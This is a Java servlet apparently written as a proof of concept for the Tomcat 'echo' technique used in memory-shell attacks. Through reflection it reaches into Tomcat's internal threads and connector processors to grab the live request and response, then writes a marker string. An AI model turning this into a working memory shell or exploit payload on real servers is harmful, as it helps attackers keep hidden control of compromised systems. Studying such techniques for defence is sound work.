package com.tomcat.memshell.TomcatEcho;



import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.Writer;
import java.lang.reflect.Field;
import java.util.ArrayList;

@WebServlet(name = "Tomcat7Servlet", value = "/Tomcat7Servlet")
public class TomcatEcho_General_789 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

        boolean flag=false;

        try {
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");

            for(int i=0;i< threads.length;i++){
                Thread thread=threads[i];
                String threadName=thread.getName();

                try{
                    Object target= getField(thread,"target");
                    Object this0=getField(target,"this$0");
                    Object handler=getField(this0,"handler");
                    Object global=getField(handler,"global");

                    ArrayList processors=(ArrayList) getField(global,"processors");

                    for (int j = 0; j < processors.size(); j++) {
                        RequestInfo requestInfo = (RequestInfo) processors.get(j);
                        if(requestInfo!=null){
                            Request req=(Request) getField(requestInfo,"req");

                            org.apache.catalina.connector.Request request1 =(org.apache.catalina.connector.Request) req.getNote(1);
                            org.apache.catalina.connector.Response response1 =request1.getResponse();

                            Writer writer=response.getWriter();
                            writer.flush();
                            writer.write("TomcatEcho789");
                            flag=true;
                            if(flag){
                                break;
                            }
                        }
                    }

                }catch (Exception e){
                    e.printStackTrace();
                }
                if(flag){
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }


    }
    public static Object getField(Object obj,String fieldName) throws Exception{
        Field field=null;
        Class clas=obj.getClass();

        while(clas!=Object.class){
            try{
                field=clas.getDeclaredField(fieldName);
                break;
            }catch (NoSuchFieldException e){
                clas=clas.getSuperclass();
            }
        }

        if (field!=null){
            field.setAccessible(true);
            return field.get(obj);
        }else{
            throw new NoSuchFieldException(fieldName);
        }


    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

    }
}